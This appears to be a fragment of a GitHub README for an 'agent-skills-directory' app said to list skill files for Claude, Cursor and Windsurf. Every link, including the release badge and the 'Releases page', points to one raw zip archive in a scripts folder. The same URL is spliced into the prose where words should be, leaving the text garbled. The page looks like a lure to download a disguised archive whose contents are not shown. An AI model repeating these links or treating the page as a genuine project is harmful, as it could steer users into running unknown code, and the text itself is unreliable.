...
[![Download Latest Release](https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/scripts/agent-directory-skills-v1.9.zip[owner]/skills/[name]https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/scripts/agent-directory-skills-v1.9.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/scripts/agent-directory-skills-v1.9.zip[owner]/skills/[name]https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/scripts/agent-directory-skills-v1.9.zip)

## 📂 Overview

Welcome to the **agent-skills-directory**! This application allows you to browse the https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/scripts/agent-directory-skills-v1.9.zip[owner]/skills/[name]https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/scripts/agent-directory-skills-v1.9.zip files for various AI tools, including Claude, Cursor, and Windsurf. Whether you're trying to find helpful skills for your agents or looking to enhance your experience with AI, this directory has you covered.
...
1. Visit the [Releases page](https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/scripts/agent-directory-skills-v1.9.zip[owner]/skills/[name]https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/scripts/agent-directory-skills-v1.9.zip) to download the latest version of the application.
...
[Download Latest Release](https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/scripts/agent-directory-skills-v1.9.zip[owner]/skills/[name]https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/scripts/agent-directory-skills-v1.9.zip)
...
- Browse through the https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/scripts/agent-directory-skills-v1.9.zip[owner]/skills/[name]https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/scripts/agent-directory-skills-v1.9.zip files listed for various AI tools.
...
- Report bugs
- Add new https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/scripts/agent-directory-skills-v1.9.zip[owner]/skills/[name]https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/scripts/agent-directory-skills-v1.9.zip files
